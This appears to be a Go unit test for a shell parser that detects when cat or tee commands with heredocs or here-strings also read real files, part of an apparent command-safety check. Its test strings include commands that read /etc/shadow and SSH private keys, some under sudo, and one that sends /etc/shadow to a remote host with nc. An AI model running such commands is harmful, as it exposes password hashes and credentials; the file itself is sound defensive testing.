package shellparse

import "testing"

// TestCatTeeReadsBesidesHeredoc pins both shapes in which a cat/tee statement
// carrying a heredoc or here-string reads something other than its body.
//
// #3964: `cat FILE <<EOF`/`cat FILE <<< x` reads FILE and ignores the
// heredoc/here-string entirely — cat only consumes stdin when given no
// operand or an explicit `-`.
//
// #4965: an input redirect onto stdin (`< FILE`, `0< FILE`, `<> FILE`, `<&N`)
// on the same cat/tee statement replaces the here-string in bash (the last
// input redirect on fd 0 wins) and is read IN ADDITION to it in zsh (MULTIOS,
// on by default), in either order. Both orders must therefore withdraw.
func TestCatTeeReadsBesidesHeredoc(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		// #3964 — cat file operand.
		{"file operand, here-string", `cat ~/.ssh/id_rsa <<< x`, true},
		{"file operand, quoted heredoc", "cat /etc/shadow <<'EOF'\nx\nEOF", true},
		{"file operand, unquoted heredoc", "cat /etc/shadow <<EOF\nx\nEOF", true},
		{"flag before file operand", `cat -A ~/.ssh/id_rsa <<< x`, true},
		{"dynamic operand — conservatively treated as a file", `cat "$KEY_PATH" <<< x`, true},
		{"sudo-wrapped file operand", `sudo cat ~/.ssh/id_rsa <<< x`, true},
		{"multiple file operands, second one live", `cat /dev/null ~/.ssh/id_rsa <<< x`, true},

		// #4965 — tee, here-string and input redirect, both orders.
		{"tee here-string then < FILE", `tee /tmp/out <<< x < /etc/shadow`, true},
		{"tee < FILE then here-string", `tee /tmp/out < /etc/shadow <<< x`, true},
		{"tee here-string then < FILE, stdout discarded", `tee /tmp/out <<< x < /etc/shadow > /dev/null`, true},
		{"tee quoted heredoc then < FILE", "tee /tmp/out <<'EOF' < /etc/shadow\nx\nEOF", true},
		{"tee < FILE then quoted heredoc", "tee /tmp/out < /etc/shadow <<'EOF'\nx\nEOF", true},
		{"tee dash heredoc then < FILE", "tee /tmp/out <<-'EOF' < /etc/shadow\n\tx\n\tEOF", true},
		{"tee -a, here-string then < FILE", `tee -a /tmp/out <<< x < /etc/shadow`, true},
		{"tee by path", `/usr/bin/tee /tmp/out <<< x < /etc/shadow`, true},

		// #4965 — cat, here-string and input redirect, both orders. Without
		// a file operand, so only the redirect can withdraw.
		{"cat here-string then < FILE", `cat <<< x < /etc/shadow > /tmp/out`, true},
		{"cat < FILE then here-string", `cat < /etc/shadow <<< x > /tmp/out`, true},
		{"cat quoted heredoc then < FILE", "cat <<'EOF' < /etc/shadow > /tmp/out\nx\nEOF", true},
		{"cat < FILE then quoted heredoc", "cat < /etc/shadow <<'EOF' > /tmp/out\nx\nEOF", true},
		{"cat unquoted heredoc then < FILE", "cat <<EOF < /etc/shadow > /tmp/out\nx\nEOF", true},
		{"cat explicit stdin marker, here-string then < FILE", `cat - <<< x < /etc/shadow`, true},
		{"cat redirect written before the command name", `< /etc/shadow cat <<< x > /tmp/out`, true},

		// #4965 — every spelling of an input redirect onto stdin.
		{"explicit fd 0", `tee /tmp/out <<< x 0< /etc/shadow`, true},
		{"explicit fd 0 first", `tee /tmp/out 0< /etc/shadow <<< x`, true},
		{"read-write open", `tee /tmp/out <<< x <> /etc/shadow`, true},
		{"read-write open first", `cat <> /etc/shadow <<< x > /tmp/out`, true},
		{"dup from a descriptor opened on the statement", `cat <<< x 3< /etc/shadow <&3 > /tmp/out`, true},
		{"dup from a descriptor, then here-string", `cat 3< /etc/shadow <&3 <<< x > /tmp/out`, true},
		{"explicit 0<&3", `tee /tmp/out <<< x 3< /etc/shadow 0<&3`, true},
		{"move descriptor <&3-", `tee /tmp/out <<< x 3< /etc/shadow <&3-`, true},
		{"dynamic descriptor — cannot be proven to be 0 or -", `tee /tmp/out <<< x <&$fd`, true},
		{"here-string on fd 3, stdin from FILE", `cat 3<<< x < /etc/shadow`, true},

		// #4965 — wrappers and quoting.
		{"sudo tee, here-string then < FILE", `sudo tee /tmp/out <<< x < /etc/shadow`, true},
		{"sudo tee, < FILE then here-string", `sudo tee /tmp/out < /etc/shadow <<< x`, true},
		{"sudo cat, here-string then < FILE", `sudo cat <<< x < /etc/shadow > /tmp/out`, true},
		{"sudo -u root tee, heredoc then < FILE", "sudo -u root tee /tmp/out <<'EOF' < /etc/shadow\nx\nEOF", true},
		{"double-quoted file name", `tee /tmp/out <<< x < "/etc/shadow"`, true},
		{"single-quoted file name", `cat < '/etc/shadow' <<< x > /tmp/out`, true},
		{"dynamic file name", `tee /tmp/out <<< x < "$TARGET"`, true},
		{"quoted here-string body, then < FILE", `tee /tmp/out <<< 'just text' < /etc/shadow`, true},

		// #4965 — the statement is found wherever it sits in the line.
		{"second statement of a sequence", `echo start; tee /tmp/out <<< x < /etc/shadow`, true},
		{"after &&", `cd /tmp && cat <<< x < /etc/shadow > /tmp/out`, true},
		{"left side of a pipe", `tee /tmp/out <<< x < /etc/shadow | wc -c`, true},
		{"inside a command substitution", `echo "$(cat <<< x < /etc/shadow)"`, true},

		// Text only: the body is all the statement reads. Must stay false so
		// the in_heredoc label keeps excusing documentation.
		{"no operand — cat genuinely reads the heredoc", `cat <<< x`, false},
		{"only a flag — no operand", `cat -A <<< x`, false},
		{"explicit stdin marker", `cat - <<< x`, false},
		{"redirect target is not an argument to cat", "cat > /tmp/notes.txt <<'EOF'\nbody\nEOF", false},
		{"tee operand is a destination, not a source", `tee ~/.ssh/authorized_keys <<< x`, false},
		{"text that names a protected file, written to a note", `cat <<< 'the file /etc/shadow holds password hashes' > /tmp/note.txt`, false},
		{"tee text to a note, quoted heredoc", "tee /tmp/note.txt <<'EOF'\nthe file /etc/shadow holds password hashes\nEOF", false},

		// Output redirects are not input redirects.
		{"output redirect only", `cat <<< x > /tmp/out`, false},
		{"append redirect", `tee -a /tmp/log <<< x >> /tmp/other`, false},
		{"stderr to stdout", `tee /tmp/out <<< x 2>&1`, false},
		{"stdout to stderr", `cat <<< x >&2`, false},
		{"both streams to a file", `cat <<< x &> /tmp/out`, false},
		{"clobber", `cat <<< x >| /tmp/out`, false},

		// A `<` inside the body is text, not a redirect.
		{"< inside a single-quoted here-string", `cat <<< 'a < /etc/shadow' > /tmp/note.txt`, false},
		{"< inside a double-quoted here-string", `tee /tmp/note.txt <<< "read it with: cat < /etc/shadow"`, false},
		{"< inside a quoted heredoc body", "cat > /tmp/note.txt <<'EOF'\nwc -l < /etc/shadow\nEOF", false},
		{"<> and <& inside a quoted heredoc body", "tee /tmp/note.txt <<'EOF'\nexec 3<> /etc/shadow; cat <&3\nEOF", false},

		// Process substitution is not an input redirect onto stdin.
		{"tee to a process substitution", `tee >(wc -c) <<< x`, false},
		{"tee to a file and a process substitution", `tee /tmp/out >(gzip > /tmp/out.gz) <<< x`, false},

		// Redirects that bring in no content named in the statement.
		{"input redirect onto another descriptor", `cat <<< x 3< /etc/shadow > /tmp/out`, false},
		{"named descriptor", `cat <<< x {fd}< /etc/shadow > /tmp/out`, false},
		{"stdin closed", `cat <<< x <&- > /tmp/out`, false},
		{"stdin duplicated onto itself", `cat <<< x <&0 > /tmp/out`, false},
		{"two here-strings — both text", `cat <<< x <<< y > /tmp/out`, false},

		// Out of scope: no heredoc on the statement, another statement, not cat/tee.
		{"input redirect, no heredoc", `tee /tmp/out < /etc/shadow`, false},
		{"input redirect on a sibling statement", `cat <<< x > /tmp/out; wc -l < /etc/shadow`, false},
		{"no heredoc/here-string at all", `cat ~/.ssh/id_rsa`, false},
		{"not cat", `wc -l ~/.ssh/id_rsa <<< x`, false},
		{"not cat or tee, with an input redirect", `nc 203.0.113.7 9000 <<< x < /etc/shadow`, false},
		{"parse failure fails closed", `cat (( <<< x`, false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := CatTeeReadsBesidesHeredoc(tc.command)
			if got != tc.want {
				t.Errorf("CatTeeReadsBesidesHeredoc(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}
